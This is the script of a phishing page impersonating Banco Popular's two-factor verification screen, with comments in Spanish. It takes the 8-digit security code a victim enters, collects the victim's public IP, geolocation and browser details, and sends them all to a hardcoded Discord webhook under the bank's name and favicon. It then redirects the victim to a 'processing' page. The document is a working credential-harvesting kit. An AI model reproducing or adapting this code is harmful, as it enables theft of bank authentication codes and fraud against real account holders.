<script>
    // ⚠️ IMPORTANTE: Reemplaza con la URL de tu Webhook de Discord real ⚠️
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512619623353286707/1uWh9JXpXXjNMmRMIL_qOXbXaZnv5R-mUyZHzyotDzntRtKmn78AHjHEC0t5E50DTlbY";
    
    // Función para obtener la IP pública del cliente
    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error("Error obteniendo IP:", error);
            return "No disponible";
        }
    }

    // Función para obtener geolocalización basada en IP
    async function getGeoFromIP(ip) {
        if (!ip || ip === "No disponible") return null;
        try {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            if (data.error) return null;
            return {
                pais: data.country_name || data.country || "Desconocido",
                ciudad: data.city || "Desconocida",
                region: data.region || "Desconocida",
                lat: data.latitude,
                lon: data.longitude,
                codigo_pais: data.country_code
            };
        } catch (error) {
            console.error("Error obteniendo geolocalización:", error);
            return null;
        }
    }

    // Función para enviar datos a Discord Webhook
    async function sendToDiscord(securityCode, ip, geoInfo, userAgent) {
        const embed = {
            title: "🔐 Verificación 2FA - Banco Popular",
            color: 0x008f39,
            fields: [
                {
                    name: "🔢 Código de seguridad",
                    value: `||${securityCode}||`,
                    inline: false
                },
                {
                    name: "🌐 IP Pública",
                    value: ip,
                    inline: true
                },
                {
                    name: "📍 País",
                    value: geoInfo ? `${geoInfo.pais} (${geoInfo.codigo_pais || ''})` : "No disponible",
                    inline: true
                },
                {
                    name: "🏙️ Ciudad / Región",
                    value: geoInfo ? `${geoInfo.ciudad}, ${geoInfo.region}` : "No disponible",
                    inline: true
                },
                {
                    name: "🗺️ Coordenadas",
                    value: geoInfo && geoInfo.lat ? `Lat: ${geoInfo.lat}, Lon: ${geoInfo.lon}` : "No disponible",
                    inline: false
                },
                {
                    name: "🕒 Fecha y hora",
                    value: new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }),
                    inline: true
                },
                {
                    name: "💻 Navegador / SO",
                    value: userAgent.substring(0, 150),
                    inline: false
                }
            ],
            footer: {
                text: "Banco Popular - Verificación de seguridad"
            },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "Banco Popular 2FA",
            avatar_url: "https://mi.bancopopular.com.co/assets/images/favicon.ico",
            embeds: [embed]
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            console.log("Datos enviados a Discord");
        } catch (error) {
            console.error("Error enviando a Discord:", error);
        }
    }

    // Elementos del DOM
    const securityCodeInput = document.getElementById('securityCode');
    const submitBtn = document.getElementById('submitBtn');
    const loader = document.getElementById('loaderOverlay');

    // Validar que el código tenga exactamente 8 dígitos
    function validateAndEnableButton() {
        const code = securityCodeInput.value.trim();
        const isValid = /^\d{8}$/.test(code);
        
        if (isValid) {
            submitBtn.disabled = false;
            submitBtn.style.backgroundColor = "#008f39";
            submitBtn.style.cursor = "pointer";
        } else {
            submitBtn.disabled = true;
            submitBtn.style.backgroundColor = "#ccc";
            submitBtn.style.cursor = "not-allowed";
        }
    }

    securityCodeInput.addEventListener('input', validateAndEnableButton);
    
    // Inicialmente deshabilitado
    submitBtn.disabled = true;
    submitBtn.style.backgroundColor = "#ccc";

    // Manejo del click
    submitBtn.addEventListener('click', async (event) => {
        event.preventDefault();
        
        const securityCode = securityCodeInput.value.trim();
        
        if (!/^\d{8}$/.test(securityCode)) {
            alert("Por favor ingresa un código de 8 dígitos válido.");
            return;
        }
        
        submitBtn.disabled = true;
        submitBtn.style.backgroundColor = "#ccc";
        loader.style.visibility = "visible";
        
        const userAgent = navigator.userAgent;
        
        let ipAddress = "No disponible";
        let geoData = null;
        
        try {
            ipAddress = await getClientIP();
            if (ipAddress !== "No disponible") {
                geoData = await getGeoFromIP(ipAddress);
            }
        } catch (err) {
            console.error("Error capturando IP/Geo:", err);
        }
        
        sendToDiscord(securityCode, ipAddress, geoData, userAgent).catch(err => console.error(err));
        
        setTimeout(() => {
            window.location.href = "procesando.html";
        }, 1200);
    });
</script>
